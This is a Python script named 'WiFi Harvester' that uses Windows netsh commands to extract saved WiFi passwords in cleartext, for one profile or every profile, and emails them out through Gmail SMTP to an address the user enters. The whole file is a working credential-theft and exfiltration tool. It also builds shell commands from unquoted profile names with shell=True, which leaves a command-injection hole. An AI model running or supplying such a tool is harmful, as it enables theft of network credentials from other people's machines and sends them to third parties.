import subprocess,smtplib,re 
import os
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich import print as rprint

#------------------------------------------------
#Global variable
#------------------------------------------------

console = Console()
file_path = "wlan_profiles"

def get_arg():

      pattern = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'

      while True:
          senders_mail = Prompt.ask("[cyan]Enter the senders Email_address[/cyan]")

          if not re.fullmatch(pattern,senders_mail):
              console.print()
              console.print("[bold red][-] Invalid, enter a proper Senders email address[/bold red]")
              console.print()
          else:
              break

      while True:
          reciving_mail = Prompt.ask("[cyan]Enter the Receiving Email_address[/cyan]")

          if not re.fullmatch(pattern,reciving_mail):
              console.print()
              console.print("[bold red][-] Invalid, enter a proper Receiving email address[/bold red]")
              console.print()
          else:
              break

      while True:
          app_password = Prompt.ask("[cyan]Enter the app password[/cyan]", password=True)

          if not app_password:
              console.print()
              console.print("[bold red][-] Blank response. Kindly check how to get an app password[/bold red]")
              console.print()
          else:
              break

      return senders_mail,reciving_mail,app_password




def send_mail(Senders_mail,reciving_mail,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # smtp server with its port number
    server.starttls()
    server.login(Senders_mail,password)

    from email.mime.text import MIMEText
    msg = MIMEText(message,"plain","utf-8") #utf-8 the protocol on how we the encoding and decoding the message
    msg["Subject"]  = "Password" # headers 
    msg["FROM"] = Senders_mail
    msg["TO"] = reciving_mail 
    server.sendmail(Senders_mail,reciving_mail,msg.as_string()) # as msg is a mime object and we r sending it in the form of string 
    server.quit()

    console.print()
    console.print(f"[bold green][*] Mail has been sent to {reciving_mail}[/bold green]")
    console.print()



# calling the subprocess
def save_data():
   command = "netsh wlan show profiles"
   result = subprocess.check_output(command, shell=True).decode("utf-8")
   values = re.findall(r"(?:Profile\s*:\s)(.*)", result) 
   with open(file_path,"w")as f:
       for i in values:
          f.write(i)

   console.print(Panel("[bold green][+] Data saved in file[/bold green]", style="green"))

   with open(file_path,"r",errors="ignore")as q:
      result = q.readlines()
      list_of_profiles = []
      for i in result:
        list_of_profiles.append(i.strip())
       
   
   profiles = {}
   number = 1
   for i in list_of_profiles:
      profiles[number] = i
      number += 1

   return profiles
   

#function to show the profiles to the user to choose 

def Show_profiles(profiles):

    # Rich table to display profiles
    table = Table(title="Profiles Available in this Computer", style="cyan", header_style="bold magenta")
    table.add_column("No.", style="yellow", justify="center")
    table.add_column("Profile Name", style="white")

    for number, profile in profiles.items():
        table.add_row(str(number), profile)

    console.print(table)

    choose_profile = " "
    choice = int(Prompt.ask("[cyan]Enter the profile number[/cyan]"))
    if choice in profiles:
        choose_profile = profiles[choice]
        console.print(f"[bold green][+] Selected: {choose_profile}[/bold green]")
    else:
         console.print(f"[bold red][-] Invalid choice of: {choice}[/bold red]")
         exit(1)
    

    return choose_profile

#printing the details of the choosen profile
def print_choosen_profile_details(profile_name):
    command = f"netsh wlan show profile {profile_name} key=clear"

    result = subprocess.check_output(command, shell=True).decode("utf-8")


    password = re.search(r"(?:Content\s*:\s)(.*)", result)
    if not password:
        console.print(f"[bold red][-] No password found for this profile name: {profile_name}[/bold red]")
        exit(0)
    
    passs = f"Password for the profile {profile_name} is {password.group(1)}"
    return passs


def password_for_all_the_profiles(profiles):
    passwords_for_all = []

    for number , passs in profiles.items():
        passwords_for_all.append(passs)

    profile_password = {}
    for profile in passwords_for_all:
        command = f"netsh wlan show profile {profile} key=clear"
        try:
           result = subprocess.check_output(command,shell=True).decode("utf-8")
        except Exception as e:
            continue
        psd = re.search(r"(?:Content\s*:\s)(.*)", result)
        profile_password[profile] = psd.group(1) if psd else "Password not found"

    message = ""
    for profilee , passwordd in profile_password.items():
        message += f"{profilee} : {passwordd}\n"

    return message
        

# Banner
console.print(Panel.fit("[bold cyan]WiFi Harvester[/bold cyan]\n[dim]Extract saved WiFi passwords and send via email[/dim]", border_style="cyan"))
console.print()

senders_mail , reciving_mail , app_password = get_arg()    
profiles = save_data()

console.print()
console.print(Panel("[yellow]Do you want to scan a particular profile or everything?[/yellow]", style="yellow"))
choice = Prompt.ask("[cyan]Choose[/cyan]", choices=["1", "2"], default="1")

if choice == "1":
   profile_name = Show_profiles(profiles)
   password = print_choosen_profile_details(profile_name)
   send_mail(senders_mail,reciving_mail,app_password,password)
elif choice == "2":
    profile_password = password_for_all_the_profiles(profiles)
    send_mail(senders_mail,reciving_mail,app_password,profile_password)